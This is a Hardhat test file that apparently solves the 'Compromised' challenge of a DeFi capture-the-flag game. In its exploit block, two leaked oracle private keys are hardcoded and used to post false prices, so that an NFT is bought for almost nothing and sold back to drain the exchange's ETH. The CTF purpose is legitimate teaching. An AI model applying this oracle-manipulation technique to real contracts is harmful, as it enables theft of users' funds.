const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        // Hex strings -> b64 decoder -> private keys of the 2 of the 3 oracles
        // To remove funds from the exchange, set the price low, buy it up
        // increase the price, sell it back.

        // Create wallets
        let pk1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        let pk2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
        let compromisedA = new ethers.Wallet(pk1, ethers.provider);
        let compromisedB = new ethers.Wallet(pk2, ethers.provider);

        // Set prices for DVNFT to 0 and buy
        await this.oracle.connect(compromisedA).postPrice("DVNFT", ethers.utils.parseEther("0"));
        await this.oracle.connect(compromisedB).postPrice("DVNFT", ethers.utils.parseEther("0"));
        await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther("0.01") });

        // Set prices for DVNFT to a high value and sell
        await this.oracle.connect(compromisedA).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        await this.oracle.connect(compromisedB).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
        await this.exchange.connect(attacker).sellOne(0);

        // Set price back to the original price since that's one of the test cases
        await this.oracle.connect(compromisedA).postPrice("DVNFT", INITIAL_NFT_PRICE);
        await this.oracle.connect(compromisedB).postPrice("DVNFT", INITIAL_NFT_PRICE);
        ;
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
